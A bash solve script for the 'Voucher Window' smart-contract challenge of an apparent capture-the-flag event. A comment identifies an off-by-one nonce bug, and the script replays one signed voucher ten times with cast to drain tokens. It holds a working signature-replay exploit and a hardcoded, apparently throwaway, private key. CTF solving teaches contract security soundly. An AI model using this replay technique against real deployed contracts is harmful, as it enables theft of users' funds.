#!/usr/bin/env bash
# Voucher Window (HIK / Hack in Cariri <HOST>) — solve on-chain.
# Bug: Drop.claim(amount,nonce,v,r,s) CHECKS used-bit[nonce] but SETS bit[nonce+1]
#      (off-by-one) -> the signed voucher (amount=100e18, nonce=0) replays forever.
# isSolved() requires token.balanceOf(player) >= 1000e18  ->  10 replays.
set -euo pipefail

RPC=https://<HOST>
PK=0xe65d5fce1e1183633eec5698a4a979f9821d01a03839f8d3af74d4813d1ae73c
PLAYER=0xa492885c4252F269Dd133944684F0dF09CEB2661
SETUP=0x5f1a36ec7740154b4b43cc8601e536d40da3ebe8
TOKEN=0x0a230d4233594a6Fad2628efC2b9684EEE0D2FD1
DROP=0x6301049349524cc57598f596cd6a335af4e60744
AMT=100000000000000000000
R=0xd0178c35673ee21cf6a435aff0e76845e255ae968e472e60c68e06581a09e81f
S=0x3f7b49722930f8bf5169a4d41a1d2ef9686a7c1a03ae8c20d886429624613d6e
V=27

for i in $(seq 1 10); do
  echo ">> claim #$i"
  cast send "$DROP" "claim(uint256,uint256,uint8,bytes32,bytes32)" \
    "$AMT" 0 "$V" "$R" "$S" --private-key "$PK" --rpc-url "$RPC" >/dev/null
done

echo "player HIK balance: $(cast call $TOKEN 'balanceOf(address)(uint256)' $PLAYER --rpc-url $RPC)"
echo "isSolved: $(cast call $SETUP 'isSolved()(bool)' --rpc-url $RPC)"
